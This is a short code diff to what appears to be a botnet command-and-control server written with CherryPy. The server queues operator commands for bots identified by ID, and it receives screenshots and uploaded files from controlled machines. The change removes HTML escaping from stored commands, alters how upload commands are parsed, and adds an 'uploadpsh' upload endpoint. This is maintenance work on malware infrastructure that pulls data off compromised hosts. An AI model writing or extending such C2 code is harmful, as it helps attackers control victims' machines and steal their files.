@@ -107,9 +107,9 @@ class API(object):
     def push(self, botid, cmd):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), html_escape(cmd), False, html_escape(botid)))
+        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
         if cmd.startswith("upload "):
-            pending_uploads.append(cmd[len("upload "):])
+            pending_uploads.append(cmd.split("upload ")[1])
         if cmd.startswith("screenshot"):
             pending_uploads.append("screenshot")
 
@@ -127,6 +127,10 @@ class API(object):
         return output
 
     @cherrypy.expose
+    def uploadpsh(self, botid, src, file):
+        self.upload(botid, src, file)
+
+    @cherrypy.expose
     def upload(self, botid, src, uploaded):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
@@ -141,6 +145,7 @@ class API(object):
         elif "screenshot" in pending_uploads:
             pending_uploads.remove("screenshot")
         else:
+            print "Unexpected file: %s" % src
             raise cherrypy.HTTPError(403)
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
